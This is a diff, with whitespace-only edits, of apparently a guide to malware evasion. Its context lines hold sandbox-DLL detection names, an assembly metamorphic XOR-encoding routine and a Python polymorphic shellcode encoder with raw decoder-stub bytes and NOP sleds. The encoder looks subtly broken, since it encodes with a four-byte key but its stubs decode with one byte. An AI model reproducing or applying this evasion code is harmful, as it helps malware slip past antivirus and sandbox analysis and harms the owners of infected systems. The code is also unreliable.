@@ -484,7 +484,7 @@ HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 // Enumerate and check against blacklist
 
 // Check loaded DLLs (sandbox hooks)
-// sbiedll.dll (Sandboxie), dbghelp.dll (debugger),
+// sbiedll.dll (Sandboxie), dbghelp.dll (debugger), 
 // SbieDll.dll, api_log.dll, dir_watch.dll
 ```
 
@@ -499,7 +499,7 @@ metamorphic_entry:
     ; Generate random key
     rdtsc
     mov ecx, eax
-
+    
     ; XOR-encode the next block with new key
     lea rsi, [rip + payload_start]
     mov rdx, payload_size
@@ -509,7 +509,7 @@ metamorphic_entry:
     inc rsi
     dec rdx
     jnz .encode_loop
-
+    
     ; Equivalent instruction substitution
     ; mov rax, X  →  push X; pop rax
     ; xor rax, rax → sub rax, rax
@@ -523,25 +523,25 @@ import os, struct, random
 
 def polymorphic_encode(shellcode: bytes) -> bytes:
     key = os.urandom(4)
-
+    
     # Random decoder stub selection
     decoders = [
         # XOR decoder
-        b"\xeb\x09\x5e\x31\xc9\xb1" + bytes([len(shellcode)]) +
+        b"\xeb\x09\x5e\x31\xc9\xb1" + bytes([len(shellcode)]) + 
         b"\x80\x36" + bytes([key[0]]) + b"\x46\xe2\xfa\xeb\x05\xe8\xf2\xff\xff\xff",
         # ADD/SUB decoder
         b"\xeb\x09\x5e\x31\xc9\xb1" + bytes([len(shellcode)]) +
         b"\x80\x2e" + bytes([key[0]]) + b"\x46\xe2\xfa\xeb\x05\xe8\xf2\xff\xff\xff",
     ]
-
+    
     decoder = random.choice(decoders)
-
+    
     # NOP sled with random NOP equivalents
     nop_equivs = [b"\x90", b"\x40\x48", b"\x66\x90", b"\x0f\x1f\x00"]
     nops = b"".join(random.choice(nop_equivs) for _ in range(random.randint(2, 8)))
-
+    
     # Encode payload
     encoded = bytes([b ^ key[i % 4] for i, b in enumerate(shellcode)])
-
+    
     return nops + decoder + encoded
 ```
